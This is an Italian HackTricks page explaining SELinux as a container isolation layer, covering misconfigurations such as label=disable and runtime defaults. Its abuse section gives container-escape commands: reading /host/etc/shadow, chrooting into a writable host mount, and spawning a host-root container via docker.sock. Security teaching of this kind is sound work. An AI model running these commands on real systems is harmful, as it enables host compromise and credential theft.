# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

SELinux è un sistema di **controllo degli accessi obbligatorio basato sulle etichette**. Ogni processo e oggetto rilevante può avere un contesto di sicurezza, e la policy decide quali domini possono interagire con quali tipi e in che modo. Negli ambienti containerizzati, ciò significa generalmente che il runtime avvia il processo del container all'interno di un dominio container confinato e assegna al contenuto del container le tipologie corrispondenti. Se la policy funziona correttamente, il processo può essere in grado di leggere e scrivere gli elementi che la propria etichetta dovrebbe poter toccare, mentre gli viene negato l'accesso ad altri contenuti dell'host, anche se tali contenuti diventano visibili tramite un mount.

Questa è una delle protezioni lato host più potenti disponibili nelle principali implementazioni di container Linux. È particolarmente importante su Fedora, RHEL, CentOS Stream, OpenShift e altri ecosistemi incentrati su SELinux. In questi ambienti, un reviewer che ignora SELinux spesso fraintenderà il motivo per cui un percorso apparentemente ovvio verso la compromissione dell'host è in realtà bloccato.

## AppArmor Vs SELinux

La differenza generale più semplice è che AppArmor è basato sui percorsi, mentre SELinux è **basato sulle etichette**. Ciò ha importanti conseguenze per la sicurezza dei container. Una policy basata sui percorsi può comportarsi diversamente se lo stesso contenuto dell'host diventa visibile sotto un percorso di mount imprevisto. Una policy basata sulle etichette, invece, considera quale sia l'etichetta dell'oggetto e cosa il dominio del processo possa fare su di esso. Questo non rende SELinux semplice, ma lo rende più resistente a una classe di supposizioni basate su trucchi relativi ai percorsi che i defender talvolta fanno accidentalmente nei sistemi basati su AppArmor.

Poiché il modello è orientato alle etichette, la gestione dei volumi dei container e le decisioni relative alla rietichettatura sono critiche per la sicurezza. Se il runtime o l'operatore modifica le etichette in modo troppo ampio per "far funzionare i mount", il confine della policy che avrebbe dovuto contenere il workload potrebbe diventare molto più debole del previsto.

## Lab

Per verificare se SELinux è attivo sull'host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Per ispezionare le label esistenti sull'host:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Per confrontare un'esecuzione normale con una in cui l'assegnazione delle etichette è disabilitata:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Su un host con SELinux abilitato, questa è una dimostrazione molto pratica perché mostra la differenza tra un workload in esecuzione nel container domain previsto e uno a cui è stato rimosso quel livello di enforcement.

## Utilizzo a runtime

Podman è particolarmente ben integrato con SELinux sui sistemi in cui SELinux fa parte dei valori predefiniti della piattaforma. Podman rootless insieme a SELinux è una delle baseline mainstream più solide per i container, perché il processo è già privo di privilegi sul lato host ed è comunque confinato dalla policy MAC. Anche Docker può usare SELinux dove supportato, sebbene gli amministratori a volte lo disabilitino per aggirare i problemi legati al labeling dei volumi. CRI-O e OpenShift fanno ampio affidamento su SELinux come parte del loro modello di isolamento dei container. Kubernetes può esporre anch'esso impostazioni relative a SELinux, ma il loro valore dipende ovviamente dal fatto che il sistema operativo del nodo supporti ed esegua effettivamente SELinux.<sup>[[2]](#references)</sup>

La lezione ricorrente è che SELinux non è un ornamento opzionale. Negli ecosistemi costruiti attorno a esso, fa parte del security boundary previsto.

## Misconfigurations

L'errore classico è `label=disable`. Dal punto di vista operativo, questo accade spesso perché un volume mount è stato negato e la risposta temporanea più rapida è stata rimuovere SELinux dall'equazione invece di correggere il modello di labeling.<sup>[[1]](#references)</sup> Un altro errore comune è il relabeling errato dei contenuti dell'host. Le operazioni di relabeling ampie possono far funzionare l'applicazione, ma possono anche estendere ciò che il container può toccare ben oltre quanto originariamente previsto.

È inoltre importante non confondere SELinux **installato** con SELinux **effettivo**. Un host può supportare SELinux e trovarsi comunque in modalità permissive, oppure il runtime potrebbe non avviare il workload nel domain previsto. In questi casi, la protezione è molto più debole di quanto la documentazione potrebbe suggerire.

## Abuse

Quando SELinux è assente, permissive o ampiamente disabilitato per il workload, i percorsi montati dall'host diventano molto più facili da abusare. Lo stesso bind mount che altrimenti sarebbe stato limitato dai label può diventare una via diretta verso i dati dell'host o verso la modifica dell'host. Questo è particolarmente rilevante se combinato con writable volume mount, directory del container runtime o scorciatoie operative che espongono percorsi sensibili dell'host per comodità.

SELinux spesso spiega perché un generico breakout writeup funziona immediatamente su un host ma fallisce ripetutamente su un altro, anche se i runtime flag sembrano simili. L'elemento mancante spesso non è affatto un namespace o una capability, ma un label boundary rimasto intatto.

Il controllo pratico più rapido consiste nel confrontare il context attivo e quindi sondare i percorsi montati dell'host o le directory del runtime che normalmente sarebbero vincolati dai label:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Se è presente un host bind mount e l'etichettatura SELinux è stata disabilitata o indebolita, spesso la divulgazione di informazioni è il primo effetto:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Se il mount è scrivibile e il container è di fatto host-root dal punto di vista del kernel, il passaggio successivo consiste nel testare una modifica controllata dell'host invece di procedere per supposizioni:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Sugli host compatibili con SELinux, la perdita delle label nelle directory dello stato di runtime può inoltre esporre percorsi diretti per l'escalation dei privilegi:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Questi comandi non sostituiscono una full escape chain, ma chiariscono molto rapidamente se SELinux era ciò che impediva l'accesso ai dati dell'host o la modifica dei file sul lato host.

### Esempio completo: SELinux disabilitato + mount host scrivibile

Se l'etichettatura SELinux è disabilitata e il filesystem dell'host è montato in modalità scrittura su `/host`, una full host escape diventa un normale caso di bind-mount abuse:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Se `chroot` ha esito positivo, il processo del container ora opera dal filesystem dell'host:
```bash
id
hostname
cat /etc/passwd | tail
```
### Esempio completo: SELinux disabilitato + directory di runtime

Se il workload può raggiungere un runtime socket una volta disabilitate le label, l'escape può essere delegata al runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
L'osservazione rilevante è che SELinux era spesso il controllo che impediva esattamente questo tipo di accesso ai percorsi dell'host o allo stato del runtime.

## Controlli

L'obiettivo dei controlli di SELinux è confermare che SELinux sia abilitato, identificare il contesto di sicurezza corrente e verificare se i file o i percorsi di interesse siano effettivamente confinati tramite etichette.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Cosa è interessante qui:

- `getenforce` dovrebbe idealmente restituire `Enforcing`; `Permissive` o `Disabled` cambiano il significato dell'intera sezione SELinux.
- Se il contesto del processo corrente appare imprevisto o troppo ampio, il workload potrebbe non essere in esecuzione secondo la policy del container prevista.
- Se i file montati dall'host o le directory di runtime hanno label a cui il processo può accedere con troppa libertà, i bind mounts diventano molto più pericolosi.

Quando si esamina un container su una piattaforma compatibile con SELinux, non considerare il labeling un dettaglio secondario. In molti casi è uno dei motivi principali per cui l'host non è già stato compromesso.

## Default del Runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimento manuale comune |
| --- | --- | --- | --- |
| Docker Engine | Dipendente dall'host | La separazione SELinux è disponibile sugli host con SELinux abilitato, ma il comportamento esatto dipende dalla configurazione dell'host/daemon | `--security-opt label=disable`, relabeling ampio dei bind mounts, `--privileged` |
| Podman | Comunemente abilitato sugli host SELinux | La separazione SELinux è una parte normale di Podman sui sistemi SELinux, a meno che non venga disabilitata | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Generalmente non assegnato automaticamente a livello di Pod | Il supporto SELinux esiste, ma i Pod solitamente necessitano di `securityContext.seLinuxOptions` o di default specifici della piattaforma; sono necessari il supporto del runtime e del nodo | `seLinuxOptions` deboli o troppo ampie, esecuzione su nodi permissivi/disabilitati, policy della piattaforma che disabilitano il labeling |
| Deployment in stile CRI-O / OpenShift | Comunemente utilizzato in modo intensivo | SELinux è spesso una parte fondamentale del modello di isolamento del nodo in questi ambienti | policy custom che ampliano eccessivamente l'accesso, disabilitazione del labeling per compatibilità |

I default di SELinux dipendono maggiormente dalla distribuzione rispetto ai default di seccomp. Sui sistemi in stile Fedora/RHEL/OpenShift, SELinux è spesso centrale nel modello di isolamento. Sui sistemi non SELinux è semplicemente assente.

## Riferimenti

- [1] [Podman Documentation: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Configure a Security Context for a Pod or Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

{{#include ../../../../banners/hacktricks-training.md}}
